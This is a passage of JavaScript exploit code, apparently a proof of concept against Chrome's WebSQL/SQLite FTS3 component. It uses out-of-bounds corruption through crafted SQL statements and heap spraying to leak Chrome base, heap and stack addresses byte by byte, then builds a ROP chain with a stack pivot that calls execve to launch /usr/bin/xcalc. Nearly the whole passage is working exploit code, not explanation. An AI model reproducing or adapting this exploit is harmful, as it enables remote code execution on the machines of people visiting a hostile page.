        leak_base_address -= 0x20000000;
        leak_base_address += B_0x1000_offset_3bytes;
    }
    else{
        if((fts3_azColumn_leaked_byte_count == 2) &&
                (fts3_zWriteExprlist_leaked_byte_count > 2)
               ){
            console.log(`Case 1`);
            leak_base_address = fts3_azColumn_leaked_value * 0x100000000;
            leak_base_address += 0x80 * 0x1000000;
            leak_base_address += B_0x1000_offset_3bytes;
        }
        else if((fts3_azColumn_leaked_byte_count == 2) &&
                (fts3_zWriteExprlist_leaked_byte_count == 2) &&
                (fts3_azColumn_leaked_value_second_byte == (fts3_zWriteExprlist_leaked_value_second_byte + 1))){
            console.log(`Case 2`);
            leak_base_address = fts3_azColumn_leaked_value * 0x100000000;
            leak_base_address += B_0x1000_offset_3bytes;
        }
        else if((fts3_azColumn_leaked_byte_count == 2) &&
                (fts3_zWriteExprlist_leaked_byte_count == 2) &&
                (fts3_azColumn_leaked_value_second_byte == fts3_zWriteExprlist_leaked_value_second_byte)
               ){
            console.log(`Case 3`);
            // Very wierd case. Only happened once...? Just gamble on the address here. Might not work.
            leak_base_address = fts3_azColumn_leaked_value * 0x100000000;
            leak_base_address += 0x80 * 0x1000000;
            leak_base_address += B_0x1000_offset_3bytes;
        }
        else{
            console.log(`Don't know how to handle this case. Stopping here...`);
            return;
        }
    }

    function partial_corrupt(){
        let statements = [];
        leak_probe_address = leak_base_address + (index * 0x1000000);
        let payload = "\x00" + num_to_hex_bytes(leak_probe_address, 6);
        let oob_string = create_oob_string(oob_chunk_size, 0x7FFFFFFF, payload);

        statements.push(`UPDATE ft_segdir SET root = ${oob_string}`);
        statements.push(`DROP TABLE test${saved_index}`);
        statements.push(`SELECT * FROM ft WHERE ft MATCH 'test'`);
        saved_index = spray(statements, oob_chunk_size, 1, "A");

        runAll(statements, (event) => {
            ping_column();
        });
    }

    function ping_column(){
        let statement = `SELECT ${"B".repeat(0x1000 - 0x100)}_${corrupted_column} FROM test${target_table_index}`;
        db.transaction((tx) => {
                tx.executeSql(
                    statement, [],
                    function(sqlTransaction, sqlResultSet) {
                        console.log('success!!!');
                        console.log(`byte : ${index.toString(16)}`)
                        found_flag = 1;
                    },
                    function(sqlTransaction, sqlError) {
                        //console.log('fail!!! : ' + sqlError.message);
                        //console.log(`test index : ${index}`)
                        if(index == 0x100 - 1){
                            found_flag = -1;
                        }
                    }
                );
            },
            dbErr,
            function(){
                if(found_flag == 0){
                    index++;
                    partial_corrupt();
                }
                else if(found_flag == 1){
                    console.log('Stage9-3 End!');

                    B_0x1000_address = leak_probe_address;
                    column_0x1000_address = B_0x1000_address - 0x1000;
                    fts_table_address = B_0x1000_address + 0x1000;
                    console.log('Leaked Heap Address : 0x' + B_0x1000_address.toString(16));
                    sploit10_1();
                }
                else{
                    console.log(`Stage 9-3 : 4th byte leak fail :(`);
                }
            }
        );
    }

    partial_corrupt();
}

function sploit10_1() {
    let bytes_to_leak = 0x48;
    let leak_start_address = fts_table_address;
    let index = 0;
    let leaked_bytes_list = [];

    console.log('Stage10-1 Start!');

    function create_aar_payload(aar_address_lo, aar_address_hi){
        let space_between = 104 - corrupted_column;
        let payload = "\x00";
        let current_B_0x1000_address = B_0x1000_address + 0x1000 - 0x100 - 120;

        for(let i=0; i<space_between; i++){
            if(i == 0){
                payload += num_to_hex_bytes(B_0x1000_address + 0x1000 - 0x100 - 1, 8);
                payload += num_to_hex_bytes(column_0x1000_address + 0x20 * 104, 8);
            }
            else{
                payload += num_to_hex_bytes(current_B_0x1000_address, 8);
                payload += num_to_hex_bytes(0, 8);
            }
            payload += num_to_hex_bytes(0, 8);
            payload += num_to_hex_bytes(0x0000000004054100, 8);
            current_B_0x1000_address += 1;
        }

        // payload += num_to_hex_bytes(0x0080c00000000063, 8);
        // payload += num_to_hex_bytes(aar_address, 8);
        // Dang I should have used BigInts in the first place... too late to refactor :(
        payload += num_to_hex_bytes(0x00000063, 4);
        payload += num_to_hex_bytes(0x0080c000, 4);
        payload += num_to_hex_bytes(aar_address_lo, 4);
        payload += num_to_hex_bytes(aar_address_hi, 4);

        return payload;
    }

    function partial_corrupt(){
        let statements = [];
        let payload = create_aar_payload(((leak_start_address & 0xFFFFFFFF) >>> 0) + index, (leak_start_address / 0x100000000) >>> 0);
        let oob_string = create_oob_string(oob_chunk_size, 0x7FFFFFFF, payload);

        statements.push(`UPDATE ft_segdir SET root = ${oob_string}`);
        statements.push(`DROP TABLE test${saved_index}`);
        statements.push(`SELECT * FROM ft WHERE ft MATCH 'test'`);
        saved_index = spray(statements, oob_chunk_size, 1, "A");

        //console.log('index : ' + index);
        index++;
        runAll(statements, (event) => {
            try_aar();
        });
    }

    function try_aar(){
        statements = [];
        let statement;
        let byte_leak_success = false;

        statements.push(`INSERT INTO test${target_table_index}(BBBB_0) VALUES(1337)`);
        runAll(statements, (event) => {
            read_aar_value();
        });
    }

    function read_aar_value(){
        statement = `SELECT hex(B_${corrupted_column}) FROM test${target_table_index} WHERE BBBB_0=1337`;

        db.transaction((tx) => {
            tx.executeSql(
                statement, [],
                function(sqlTransaction, sqlResultSet) {
                    let leaked_byte;

                    //console.log('success!!!');
                    if(sqlResultSet.rows.length == 1){
                        //console.log(sqlResultSet.rows.item(0));
                        let row = sqlResultSet.rows[0];
                        let value = row[`hex(B_${corrupted_column})`];

                        if(value.length == 0){
                            leaked_byte = 0;
                        }
                        else{
                            leaked_byte = parseInt(value.substring(0,2), 16);
                        }
                        leaked_bytes_list.push(leaked_byte);
                        byte_leak_success = true;
                    }
                    else if(sqlResultSet.rows.length > 1){
                        console.log(`More than 1 row...?`);
                    }
                    else{
                        console.log(`What...? Nothing...?`);
                    }
                },
                function(sqlTransaction, sqlError) {
                    console.log(`Oh hell no...`);
                }
                );
        },
        dbErr,
        function(){
            if(byte_leak_success == true){
                statements = [];
                statements.push(`DELETE FROM test${target_table_index} WHERE BBBB_0 = 1337`);
                runAll(statements, (event) => {
                    if(index == bytes_to_leak){
                        console.log(`Stage10-1 Done!`);
                        console.log(leaked_bytes_list);

                        fts_table_bytes_0x48 = leaked_bytes_list;
                        chrome_base_hi = leaked_bytes_list[7] * 0x1000000 + leaked_bytes_list[6] * 0x10000 + leaked_bytes_list[5] * 0x100 + leaked_bytes_list[4];
                        chrome_base_lo = leaked_bytes_list[3] * 0x1000000 + leaked_bytes_list[2] * 0x10000 + leaked_bytes_list[1] * 0x100 + leaked_bytes_list[0];
                        chrome_base_lo -= leaked_chrome_address_offset;
                        chrome_main_heap_hi = chrome_base_hi;
                        chrome_main_heap_lo = chrome_base_lo + chrome_main_heap_offset;

                        console.log('Chrome Base hi : 0x' + chrome_base_hi.toString(16));
                        console.log('Chrome Base lo : 0x' + chrome_base_lo.toString(16));

                        sploit10_2();
                    }
                    else{
                        partial_corrupt();
                    }
                });
            }
            else{
                console.log(`There's something weird... in the neighborhood...`);
            }
        });
    }

    partial_corrupt();
}

function sploit10_2() {
    let bytes_to_leak = 0x8;
    let index = 0;
    let leaked_bytes_list = [];

    console.log('Stage10-2 Start!');

    function create_aar_payload(aar_address_lo, aar_address_hi){
        let space_between = 104 - corrupted_column;
        let payload = "\x00";
        let current_B_0x1000_address = B_0x1000_address + 0x1000 - 0x100 - 120;

        for(let i=0; i<space_between; i++){
            if(i == 0){
                payload += num_to_hex_bytes(B_0x1000_address + 0x1000 - 0x100 - 1, 8);
                payload += num_to_hex_bytes(column_0x1000_address + 0x20 * 104, 8);
            }
            else{
                payload += num_to_hex_bytes(current_B_0x1000_address, 8);
                payload += num_to_hex_bytes(0, 8);
            }
            payload += num_to_hex_bytes(0, 8);
            payload += num_to_hex_bytes(0x0000000004054100, 8);
            current_B_0x1000_address += 1;
        }

        payload += num_to_hex_bytes(0x00000063, 4);
        payload += num_to_hex_bytes(0x0080c000, 4);
        payload += num_to_hex_bytes(aar_address_lo, 4);
        payload += num_to_hex_bytes(aar_address_hi, 4);

        return payload;
    }

    function partial_corrupt(){
        let statements = [];
        let payload = create_aar_payload(chrome_main_heap_lo + first_leak_offset + index, chrome_main_heap_hi);
        let oob_string = create_oob_string(oob_chunk_size, 0x7FFFFFFF, payload);

        statements.push(`UPDATE ft_segdir SET root = ${oob_string}`);
        statements.push(`DROP TABLE test${saved_index}`);
        statements.push(`SELECT * FROM ft WHERE ft MATCH 'test'`);
        saved_index = spray(statements, oob_chunk_size, 1, "A");

        //console.log('index : ' + index);
        index++;
        runAll(statements, (event) => {
            try_aar();
        });
    }

    function try_aar(){
        statements = [];
        let statement;
        let byte_leak_success = false;

        statements.push(`INSERT INTO test${target_table_index}(BBBB_0) VALUES(1337)`);
        runAll(statements, (event) => {
            read_aar_value();
        });
    }

    function read_aar_value(){
        statement = `SELECT hex(B_${corrupted_column}) FROM test${target_table_index} WHERE BBBB_0=1337`;

        db.transaction((tx) => {
            tx.executeSql(
                statement, [],
                function(sqlTransaction, sqlResultSet) {
                    let leaked_byte;

                    //console.log('success!!!');
                    if(sqlResultSet.rows.length == 1){
                        //console.log(sqlResultSet.rows.item(0));
                        let row = sqlResultSet.rows[0];
                        let value = row[`hex(B_${corrupted_column})`];

                        if(value.length == 0){
                            leaked_byte = 0;
                        }
                        else{
                            leaked_byte = parseInt(value.substring(0,2), 16);
                        }
                        leaked_bytes_list.push(leaked_byte);
                        byte_leak_success = true;
                    }
                    else if(sqlResultSet.rows.length > 1){
                        console.log(`More than 1 row...?`);
                    }
                    else{
                        console.log(`What...? Nothing...?`);
                    }
                },
                function(sqlTransaction, sqlError) {
                    console.log(`Oh hell no...`);
                }
                );
        },
        dbErr,
        function(){
            if(byte_leak_success == true){
                statements = [];
                statements.push(`DELETE FROM test${target_table_index} WHERE BBBB_0 = 1337`);
                runAll(statements, (event) => {
                    if(index == bytes_to_leak){
                        console.log(`Stage10-2 Done!`);
                        console.log(leaked_bytes_list);

                        main_stack_hi = leaked_bytes_list[7] * 0x1000000 + leaked_bytes_list[6] * 0x10000 + leaked_bytes_list[5] * 0x100 + leaked_bytes_list[4];
                        main_stack_lo = leaked_bytes_list[3] * 0x1000000 + leaked_bytes_list[2] * 0x10000 + leaked_bytes_list[1] * 0x100 + leaked_bytes_list[0];

                        console.log('Main Stack hi : 0x' + main_stack_hi.toString(16));
                        console.log('Main Stack lo : 0x' + main_stack_lo.toString(16));

                        sploit10_3();
                    }
                    else{
                        partial_corrupt();
                    }
                });
            }
            else{
                console.log(`There's something weird... in the neighborhood...`);
            }
        });
    }

    partial_corrupt();
}

function sploit10_3() {
    let bytes_to_leak = 0x8;
    let index = 0;
    let leaked_bytes_list = [];

    console.log('Stage10-3 Start!');

    function create_aar_payload(aar_address_lo, aar_address_hi){
        let space_between = 104 - corrupted_column;
        let payload = "\x00";
        let current_B_0x1000_address = B_0x1000_address + 0x1000 - 0x100 - 120;

        for(let i=0; i<space_between; i++){
            if(i == 0){
                payload += num_to_hex_bytes(B_0x1000_address + 0x1000 - 0x100 - 1, 8);
                payload += num_to_hex_bytes(column_0x1000_address + 0x20 * 104, 8);
            }
            else{
                payload += num_to_hex_bytes(current_B_0x1000_address, 8);
                payload += num_to_hex_bytes(0, 8);
            }
            payload += num_to_hex_bytes(0, 8);
            payload += num_to_hex_bytes(0x0000000004054100, 8);
            current_B_0x1000_address += 1;
        }

        payload += num_to_hex_bytes(0x00000063, 4);
        payload += num_to_hex_bytes(0x0080c000, 4);
        payload += num_to_hex_bytes(aar_address_lo, 4);
        payload += num_to_hex_bytes(aar_address_hi, 4);

        return payload;
    }

    function partial_corrupt(){
        let statements = [];
        let payload = create_aar_payload(main_stack_lo - second_leak_offset + index, main_stack_hi);
        let oob_string = create_oob_string(oob_chunk_size, 0x7FFFFFFF, payload);

        statements.push(`UPDATE ft_segdir SET root = ${oob_string}`);
        statements.push(`DROP TABLE test${saved_index}`);
        statements.push(`SELECT * FROM ft WHERE ft MATCH 'test'`);
        saved_index = spray(statements, oob_chunk_size, 1, "A");

        //console.log('index : ' + index);
        index++;
        runAll(statements, (event) => {
            try_aar();
        });
    }

    function try_aar(){
        statements = [];
        let statement;
        let byte_leak_success = false;

        statements.push(`INSERT INTO test${target_table_index}(BBBB_0) VALUES(1337)`);
        runAll(statements, (event) => {
            read_aar_value();
        });
    }

    function read_aar_value(){
        statement = `SELECT hex(B_${corrupted_column}) FROM test${target_table_index} WHERE BBBB_0=1337`;

        db.transaction((tx) => {
            tx.executeSql(
                statement, [],
                function(sqlTransaction, sqlResultSet) {
                    let leaked_byte;

                    //console.log('success!!!');
                    if(sqlResultSet.rows.length == 1){
                        //console.log(sqlResultSet.rows.item(0));
                        let row = sqlResultSet.rows[0];
                        let value = row[`hex(B_${corrupted_column})`];

                        if(value.length == 0){
                            leaked_byte = 0;
                        }
                        else{
                            leaked_byte = parseInt(value.substring(0,2), 16);
                        }
                        leaked_bytes_list.push(leaked_byte);
                        byte_leak_success = true;
                    }
                    else if(sqlResultSet.rows.length > 1){
                        console.log(`More than 1 row...?`);
                    }
                    else{
                        console.log(`What...? Nothing...?`);
                    }
                },
                function(sqlTransaction, sqlError) {
                    console.log(`Oh hell no...`);
                }
                );
        },
        dbErr,
        function(){
            if(byte_leak_success == true){
                statements = [];
                statements.push(`DELETE FROM test${target_table_index} WHERE BBBB_0 = 1337`);
                runAll(statements, (event) => {
                    if(index == bytes_to_leak){
                        console.log(`Stage10-3 Done!`);
                        console.log(leaked_bytes_list);

                        websql_stack_hi = leaked_bytes_list[7] * 0x1000000 + leaked_bytes_list[6] * 0x10000 + leaked_bytes_list[5] * 0x100 + leaked_bytes_list[4];
                        websql_stack_lo = leaked_bytes_list[3] * 0x1000000 + leaked_bytes_list[2] * 0x10000 + leaked_bytes_list[1] * 0x100 + leaked_bytes_list[0];
                        ret_addr_hi = websql_stack_hi;
                        ret_addr_lo = websql_stack_lo - ret_addr_offset;
                        coop_addr_hi = chrome_base_hi;
                        coop_addr_lo = chrome_base_lo + coop_addr_offset;

                        console.log('WebSQL Stack hi : 0x' + websql_stack_hi.toString(16));
                        console.log('WebSQL Stack lo : 0x' + websql_stack_lo.toString(16));

                        sploit11();
                    }
                    else{
                        partial_corrupt();
                    }
                });
            }
            else{
                console.log(`There's something weird... in the neighborhood...`);
            }
        });
    }

    partial_corrupt();
}

function sploit11(){
    let leaked_bytes_list = fts_table_bytes_0x48;

    console.log('Stage11 Start!');

/*
.text:000000000404C690                 mov     rcx, [rdi+18h]  ; 0x18 => 0x800
.text:000000000404C694                 movsxd  rdx, dword ptr [rcx+0Ch] ; dword 0x80C => 0
.text:000000000404C698                 xor     eax, eax
.text:000000000404C69A                 cmp     edx, [rcx+8]    ; dword 0x808 => 1
.text:000000000404C69D                 jge     short locret_404C6D2
.text:000000000404C69F                 mov     rax, [rcx]      ; 0x800 => 0x810
.text:000000000404C6A2                 shl     rdx, 4
.text:000000000404C6A6                 mov     rax, [rax+rdx]  ; 0x810 => Stack Pivot Gadget
.text:000000000404C6AA                 mov     rdx, [rdi+28h]  ; 0x28 => ret addr
.text:000000000404C6AE                 mov     [rdx], rax
.text:000000000404C6B1                 mov     rax, [rcx]
.text:000000000404C6B4                 movsxd  rdx, dword ptr [rcx+0Ch]
.text:000000000404C6B8                 shl     rdx, 4
.text:000000000404C6BC                 movsxd  rax, dword ptr [rax+rdx+8] ; dword 0x818 => 0
.text:000000000404C6C1                 mov     rdx, [rdi+28h]
.text:000000000404C6C5                 mov     [rdx+8], rax
.text:000000000404C6C9                 add     dword ptr [rcx+0Ch], 1
.text:000000000404C6CD                 mov     eax, 1

Qword 0x018 => 0x800
Qword 0x028 => ret addr
Qword 0x800 => 0x810
Dword 0x808 => 1
Dword 0x80C => 0
Qword 0x810 => Stack Pivot Gadget
Dword 0x818 => 0


0x000000000198caf3 : pop rdi ; ret
0x000000000191c37e : pop rsi ; ret
0x000000000192e52f : pop rdx ; pop r9 ; ret
0x000000000623c5cc : push rdi ; pop rsp ; mov byte ptr [rdi + 0x60], 0 ; pop rbx ; pop r14 ; pop r15 ; pop rbp ; ret
0x0000000007DCB060 : jmp     cs:execve
*/
    function build_rop_chain(){
        let total_size = 0x1000;
        let payload = "";

        stack_pivot_gadget_addr_hi = chrome_base_hi;
        stack_pivot_gadget_addr_lo = chrome_base_lo + stack_pivot_gadget_offset;
        pop_rdi_gadget_addr_hi = chrome_base_hi;
        pop_rdi_gadget_addr_lo = chrome_base_lo + pop_rdi_gadget_offset;
        pop_rsi_gadget_addr_hi = chrome_base_hi;
        pop_rsi_gadget_addr_lo = chrome_base_lo + pop_rsi_gadget_offset;
        pop_rdx_gadget_addr_hi = chrome_base_hi;
        pop_rdx_gadget_addr_lo = chrome_base_lo + pop_rdx_gadget_offset;
        execve_gadget_addr_hi = chrome_base_hi;
        execve_gadget_addr_lo = chrome_base_lo + execve_gadget_offset;


        payload += num_to_hex_bytes(B_0x1000_address - 0x20, 8);    // 0x00
        payload += "\x00".repeat(8);                                // 0x08
        payload += "\x00".repeat(8);                                // 0x10
        payload += num_to_hex_bytes(B_0x1000_address + 0x800, 8);   // 0x18
        payload += num_to_hex_bytes(pop_rdi_gadget_addr_lo, 4);     // 0x20
        payload += num_to_hex_bytes(pop_rdi_gadget_addr_hi, 4);
        payload += num_to_hex_bytes(ret_addr_lo, 4);                // 0x28
        payload += num_to_hex_bytes(ret_addr_hi, 4);

        // gadgets
        payload += num_to_hex_bytes(pop_rdi_gadget_addr_lo, 4);     // 0x30
        payload += num_to_hex_bytes(pop_rdi_gadget_addr_hi, 4);
        payload += num_to_hex_bytes(B_0x1000_address + 0x430, 8);   // 0x38
        payload += num_to_hex_bytes(pop_rsi_gadget_addr_lo, 4);     // 0x40
        payload += num_to_hex_bytes(pop_rsi_gadget_addr_hi, 4);
        payload += num_to_hex_bytes(B_0x1000_address + 0x410, 8);   // 0x48
        payload += num_to_hex_bytes(pop_rdx_gadget_addr_lo, 4);     // 0x50
        payload += num_to_hex_bytes(pop_rdx_gadget_addr_hi, 4);
        payload += num_to_hex_bytes(B_0x1000_address + 0x400, 8);   // 0x58
        payload += "\x00".repeat(8);                                // 0x60 : we need this dummy value for that garbage instruction in the stack pivot
        payload += num_to_hex_bytes(execve_gadget_addr_lo, 4);      // 0x68
        payload += num_to_hex_bytes(execve_gadget_addr_hi, 4);

        payload += "\x00".repeat(0x400 - payload.length);
        payload += num_to_hex_bytes(B_0x1000_address + 0x420, 8);   // 0x400
        payload += "\x00".repeat(8);                                // 0x408
        payload += num_to_hex_bytes(B_0x1000_address + 0x430, 8);   // 0x410
        payload += "\x00".repeat(8);                                // 0x418
        payload += "DISPLAY=:0" + "\x00";                           // 0x420
        payload += "\x00".repeat(0x430 - payload.length);
        payload += "/usr/bin/xcalc" + "\x00";                       // 0x430

        payload += "\x00".repeat(0x800 - payload.length);
        payload += num_to_hex_bytes(B_0x1000_address + 0x810, 8);   // 0x800
        payload += num_to_hex_bytes(1, 4);                          // 0x808
        payload += num_to_hex_bytes(0, 4);                          // 0x80C
        payload += num_to_hex_bytes(stack_pivot_gadget_addr_lo, 4); // 0x810
        payload += num_to_hex_bytes(stack_pivot_gadget_addr_hi, 4);
        payload += "\x00".repeat(8);                                // 0x818

        payload += "\x00".repeat(total_size - payload.length);

        return payload;
    }

    function partial_corrupt(){
        let statements = [];
        let space_between = (0x1000 - (0x20 * corrupted_column)) - 0x10;
        let payload = "\x00".repeat(space_between + 1);
        payload += num_to_hex_bytes(coop_addr_lo, 4);
        payload += num_to_hex_bytes(coop_addr_hi, 4);
        payload += num_to_hex_bytes(0, 8);
        payload += build_rop_chain();

        for(let i=0; i<leaked_bytes_list.length; i++){
            payload += String.fromCharCode(leaked_bytes_list[i]);
        }
        payload += num_to_hex_bytes(B_0x1000_address, 8);
        let oob_string = create_oob_string(oob_chunk_size, 0x7FFFFFFF, payload);

        statements.push(`UPDATE ft_segdir SET root = ${oob_string}`);
        statements.push(`DROP TABLE test${saved_index}`);
        statements.push(`SELECT * FROM ft WHERE ft MATCH 'test'`);
        saved_index = spray(statements, oob_chunk_size, 1, "A");

        //alert('DEBUG ATTACH');
        runAll(statements, (event) => {
            statements = [];
            statements.push(`DROP TABLE test${code_execution_table_index + 0}`);
            statements.push(`DROP TABLE test${code_execution_table_index + 1}`);
            statements.push(`DROP TABLE test${code_execution_table_index + 2}`);
            statements.push(`DROP TABLE test${code_execution_table_index + 3}`);
            statements.push(`DROP TABLE test${code_execution_table_index + 4}`);

            runAll(statements, (event) => {
                console.log(`It shouldn't reach here`);
            });

        });
    }

    partial_corrupt();
}

//setTimeout(sploit1, 1000 * 10);
